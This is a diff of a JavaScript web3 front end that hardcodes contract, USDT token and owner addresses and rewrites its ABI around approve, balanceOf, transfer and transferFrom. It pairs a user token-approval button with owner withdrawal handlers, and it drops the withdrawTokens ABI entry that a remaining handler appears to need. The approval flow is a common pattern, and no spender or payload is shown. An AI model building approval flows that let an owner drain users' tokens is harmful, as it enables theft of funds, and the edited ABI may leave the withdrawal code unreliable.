@@ -3,59 +3,43 @@ const contractAddress = '0x4a21a1a07a3157e06d739D3bb231628143a66C29'; // Address
 const tokenAddress = '0x59610B067eCfeCEdaf146A5E9B180C440f008575'; // Address of the USDT token contract
 const ownerAddress = '0x9052EB26C0b9836335Ec153413F80bAEc7536414'; // Address of the contract owner
 
-// Define the contract's ABI (Application Binary Interface)
+// The ABI for the contract (from the address you provided)
 const contractABI = [
   {
-    "inputs": [{ "internalType": "address", "name": "spender", "type": "address" },
-               { "internalType": "uint256", "name": "amount", "type": "uint256" }],
+    "inputs": [
+      { "internalType": "address", "name": "spender", "type": "address" },
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
+    ],
     "name": "approve",
     "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
     "stateMutability": "nonpayable",
     "type": "function"
   },
   {
-    "inputs": [],
-    "name": "checkBalance",
+    "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
+    "name": "balanceOf",
     "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
     "stateMutability": "view",
     "type": "function"
   },
   {
-    "inputs": [],
-    "name": "withdrawETH",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  },
-  {
-    "inputs": [],
-    "name": "withdrawTokens",
-    "outputs": [],
-    "stateMutability": "nonpayable",
-    "type": "function"
-  }
-];
-
-// Define the USDT Token ABI (standard ERC-20)
-const tokenABI = [
-  {
-    "constant": true,
-    "inputs": [{ "name": "owner", "type": "address" }],
-    "name": "balanceOf",
-    "outputs": [{ "name": "balance", "type": "uint256" }],
-    "payable": false,
-    "stateMutability": "view",
-    "type": "function"
-  },
-  {
-    "constant": false,
     "inputs": [
-      { "name": "spender", "type": "address" },
-      { "name": "amount", "type": "uint256" }
+      { "internalType": "address", "name": "recipient", "type": "address" },
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
     ],
-    "name": "approve",
-    "outputs": [{ "name": "", "type": "bool" }],
-    "payable": false,
+    "name": "transfer",
+    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      { "internalType": "address", "name": "sender", "type": "address" },
+      { "internalType": "address", "name": "recipient", "type": "address" },
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
+    ],
+    "name": "transferFrom",
+    "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
     "stateMutability": "nonpayable",
     "type": "function"
   }
@@ -98,7 +82,7 @@ approveButton.addEventListener('click', async () => {
   try {
     const accounts = await web3.eth.getAccounts();
     const userAddress = accounts[0];
-    const tokenContract = new web3.eth.Contract(tokenABI, tokenAddress);
+    const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
 
     // Send approve transaction
     await tokenContract.methods
@@ -159,3 +143,4 @@ withdrawTokensButton.addEventListener('click', async () => {
     alert('Token withdrawal failed');
   }
 });
+
